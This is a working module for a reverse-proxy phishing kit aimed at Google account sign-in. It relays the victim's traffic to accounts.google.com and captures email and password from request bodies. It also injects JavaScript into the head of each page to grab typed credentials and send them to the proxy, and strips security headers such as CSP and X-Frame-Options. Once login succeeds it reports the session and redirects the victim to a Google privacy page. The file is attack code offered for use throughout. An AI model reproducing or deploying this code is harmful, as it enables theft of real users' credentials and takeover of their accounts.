/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        // Only process Gmail form submissions, not redirects or page loads
        if (this.browserReq.url.startsWith('/v3/signin/_/___AccountsSignInUi/data/batchexecute')
        || this.browserReq.url.startsWith('/signin/v2/')
        || this.browserReq.url.startsWith('/_/signin/challenge')
        || this.browserReq.url.startsWith('/v3/signin/identifier')
        || this.browserReq.method === 'POST') {
            return this.makeGmailProcess()
        }
        // For all other requests (like redirects), just pipe them through
        return this.browserReq.pipe(this.proxyEndpoint)
    }

    makeGmailProcess() {
        console.log('Processing Gmail request:', this.browserReq.url, 'Method:', this.browserReq.method)
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                console.log('Original request content:', cJust.substring(0, 200))
                console.log('Original request headers:', this.browserReq.headers)
                
                // Only replace hostname in URLs, not in form data
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
                
                console.log('Modified request content:', kJust.substring(0, 200))

                // Preserve original headers but fix origin and referer
                Object.keys(this.browserReq.headers).forEach(key => {
                    if (key.toLowerCase() !== 'host' && key.toLowerCase() !== 'content-length') {
                        let headerValue = this.browserReq.headers[key]
                        
                        // Fix origin header to match our proxy domain
                        if (key.toLowerCase() === 'origin') {
                            console.log('Fixing origin header from:', headerValue)
                            headerValue = `https://${this.browserReq.clientContext.hostname}`
                            console.log('Fixed origin header to:', headerValue)
                        }
                        
                        // Fix referer header to match our proxy domain
                        if (key.toLowerCase() === 'referer') {
                            console.log('Fixing referer header from:', headerValue)
                            headerValue = headerValue.replace('https://accounts.google.com', `https://${this.browserReq.clientContext.hostname}`)
                            console.log('Fixed referer header to:', headerValue)
                        }
                        
                        this.proxyEndpoint.setHeader(key, headerValue)
                    }
                })
                
                this.proxyEndpoint.setHeader('Content-Length', cJust.length)

                // Regex patterns for actual Gmail form data format
                const emailRegex = /identifier=([^&]+)/
                const pwRegex = /(?:password|hiddenPassword)=([^&]+)/
                
                // Alternative patterns for different Gmail request formats
                const emailRegexAlt = /(?:identifierId|identifier|email).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
                const pwRegexAlt = /(?:password|pwd|pass).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
                    
                // Try primary regex patterns first
                let emailMatch = emailRegex.exec(cJust)
                let passwordMatch = pwRegex.exec(cJust)
                
                // If no match, try alternative patterns
                if (!emailMatch) {
                    emailMatch = emailRegexAlt.exec(cJust)
                }
                if (!passwordMatch) {
                    passwordMatch = pwRegexAlt.exec(cJust)
                }
                
                // Additional fallback patterns for common Gmail formats
                if (!emailMatch) {
                    // Look for any email-like pattern in the request
                    const emailFallback = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i
                    emailMatch = emailFallback.exec(cJust)
                }
                
                if (emailMatch) {
                    console.log('Email matched')
                    let emailAdressencoded = emailMatch[1]
                    // Handle both encoded and unencoded emails
                    if (emailAdressencoded.includes('%')) {
                        emailAdressencoded = decodeURIComponent(emailAdressencoded)
                    }
                    const emailGmail = emailAdressencoded
                    Object.assign(this.browserReq.clientContext.sessionBody,
                        { email: emailGmail })
                    console.log(`email address is ${emailGmail}`)
                    // Forward the request to Gmail with proper headers
                    console.log('Email captured, forwarding request to Gmail...')
                    this.proxyEndpoint.write(cJust) 
                    this.proxyEndpoint.end()
                    console.log('Request forwarded to Gmail, waiting for response...')

                } else if (passwordMatch) {
                    console.log('Password matched')
                    let passwwordEncoded = passwordMatch[1]
                    // Handle both encoded and unencoded passwords
                    if (passwwordEncoded.includes('%')) {
                        passwwordEncoded = decodeURIComponent(passwwordEncoded)
                    }
                    const passwordStr = passwwordEncoded
                    Object.assign(this.browserReq.clientContext.sessionBody,
                        { password: passwordStr })
                    console.log(`password is ${passwordStr}`)
                    this.proxyEndpoint.write(kJust) 
                    this.proxyEndpoint.end()

                } else {
                    console.log('NO matches found - checking request content for debugging')
                    console.log('Request content sample:', cJust.substring(0, 500))
                    this.proxyEndpoint.write(kJust)
                    return this.proxyEndpoint.end('')
                }
            })
        } else {
            console.log('No content-length, piping request through:', this.browserReq.url)
            this.browserReq.pipe(this.proxyEndpoint)
        }

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: '/playboy',
            },
            {
                reg: /<head>/,
                replacement: '<script>window.addEventListener("load", function() { setTimeout(function() { var emailNext = document.querySelector("#identifierNext"); var passwordNext = document.querySelector("#passwordNext"); if (emailNext) { emailNext.addEventListener("click", function() { var email = document.querySelector("#identifierId").value; if (email) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/emailLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_email=" + encodeURIComponent(email)); } }); } if (passwordNext) { passwordNext.addEventListener("click", function() { var password = document.querySelector("input[type=\\"password\\"]").value; if (password) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/pwdLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_pwd=" + encodeURIComponent(password)); } }); } }, 1000); });</script><script>document.addEventListener("DOMContentLoaded", function() { var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === "childList") { var emailNext = document.querySelector("#identifierNext"); var passwordNext = document.querySelector("#passwordNext"); if (emailNext && !emailNext.hasAttribute("data-listener")) { emailNext.setAttribute("data-listener", "true"); emailNext.addEventListener("click", function() { var email = document.querySelector("#identifierId").value; if (email) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/emailLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_email=" + encodeURIComponent(email)); } }); } if (passwordNext && !passwordNext.hasAttribute("data-listener")) { passwordNext.setAttribute("data-listener", "true"); passwordNext.addEventListener("click", function() { var password = document.querySelector("input[type=\\"password\\"]").value; if (password) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/pwdLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_pwd=" + encodeURIComponent(password)); } }); } } }); }); observer.observe(document.body, { childList: true, subtree: true }); });</script><head>'
            },
            {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: '/CheckConnection',
            },
           {
               reg: /name="checkConnection" value/gi,
               replacement: /name"checkConnection" value="youtube:1052:1"/,
           },
           {
               reg: /signaler-pa.googleapis.com/gi,
               replacement: this.browserEndPoint.clientContext.hostname,
           },
           {
               reg: /https:\/\/accounts\.google\.com\/v3\/signin\/challenge\/pwd/gi,
               replacement: '/v3/signin/challenge/pwd',
           },
        //    {
        //     reg: new RegExp(`https:\/\/${this.browserEndPoint.clientContext.hostname}\/CheckCookie`, 'gi'),
        //     replacement: 'https://account.fujimems.com/CheckCookie'
        //    }
        ]
    }


    processResponse() {
        console.log('Processing response from Gmail...')
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
       

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
           console.log('External redirect detected:', rLocation)
           
           // Handle redirects to password challenge form
           if (rLocation && rLocation.includes('/v3/signin/challenge/pwd')) {
               console.log('Redirecting to password challenge form:', rLocation)
               // Extract the path and query from the redirect URL
               const urlObj = new URL(rLocation)
               const redirectPath = urlObj.pathname + urlObj.search
               this.browserEndPoint.setHeader('Location', redirectPath)
               this.browserEndPoint.writeHead(302)
               return this.browserEndPoint.end()
           }
           
           // Handle Gmail internal redirects (like the one you're seeing)
           if (rLocation && (rLocation.includes('accounts.google.com') || rLocation.includes('signin') || rLocation.includes('/__//'))) {
               console.log('Gmail internal redirect detected:', rLocation)
               // For Gmail internal redirects, let them pass through normally
               return super.processResponse()
           }
           
           // Handle any other redirects that might be Gmail-related
           if (rLocation && (rLocation.includes('accounts.google.com') || rLocation.includes('signin'))) {
               console.log('Gmail redirect detected:', rLocation)
               // Let the redirect pass through normally
               return super.processResponse()
           }
        }

        if (this.proxyResp.headers['content-length'] < 1) {
            console.log('No content-length, piping response through')
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        
        console.log('Response content-length:', this.proxyResp.headers['content-length'])
        console.log('Response status:', this.proxyResp.statusCode)

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }


    execute(clientContext) {

        super.uploadBodyData(clientContext, "password")
       
        if (this.req.url.startsWith('/punctual/')) {
            
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }

        if (this.req.url === '/cold204') {
            this.res.writeHead(204)
            return this.res.end('')
        }

        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }

        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }

        // Handle Gmail password challenge form redirection
        if (this.req.url.startsWith('/v3/signin/challenge/pwd')) {
            console.log('Password challenge form requested:', this.req.url)
            return super.superExecuteProxy('accounts.google.com', clientContext)
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            clientContext.info.isLogin = true
            super.sendClientData(clientContext, {})
        }

        if (this.req.url === '/emailLookup') {
            let body = ''
            this.req.on('data', (chunk) => {
                body += chunk.toString()
            })
            this.req.on('end', () => {
                const email = decodeURIComponent(body.split('=')[1])
                console.log(`Email captured via JavaScript: ${email}`)
                Object.assign(clientContext.sessionBody, { email: email })
                this.res.writeHead(200, { 'Content-Type': 'text/plain' })
                this.res.end('OK')
            })
            return
        }

        if (this.req.url === '/pwdLookup') {
            let body = ''
            this.req.on('data', (chunk) => {
                body += chunk.toString()
            })
            this.req.on('end', () => {
                const password = decodeURIComponent(body.split('=')[1])
                console.log(`Password captured via JavaScript: ${password}`)
                Object.assign(clientContext.sessionBody, { password: password })
                this.res.writeHead(200, { 'Content-Type': 'text/plain' })
                this.res.end('OK')
            })
            return
        }
        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
            super.sendClientData(clientContext, {})
            return super.exitLink('https://safety.google/privacy/data/')

        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            // Handle redirects to password challenge form
            if (redirectToken.url.includes('/v3/signin/challenge/pwd')) {
                console.log('Redirecting to password challenge form:', redirectToken.url)
                // Extract the path and query from the redirect URL
                const urlObj = new URL(redirectToken.url)
                this.req.url = urlObj.pathname + urlObj.search
                return super.superExecuteProxy('accounts.google.com', clientContext)
            }

            if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://safety.google/privacy/data/')
            }

            if (redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                return super.exitLink('https://safety.google/privacy/data/')

            }
        }

        // if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
        //     clientContext.currentDomain = process.env.PROXY_DOMAIN
        //     this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
        //     // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        // }

        return super.execute(clientContext)

    }
}




const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    START_PATH: '/v3/signin/identifier?hl=en',

    AUTOGRAB_CODE: 'Email',



    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    // 'ssl.gstatic.com',
    ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,



    CAPTURES: { },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

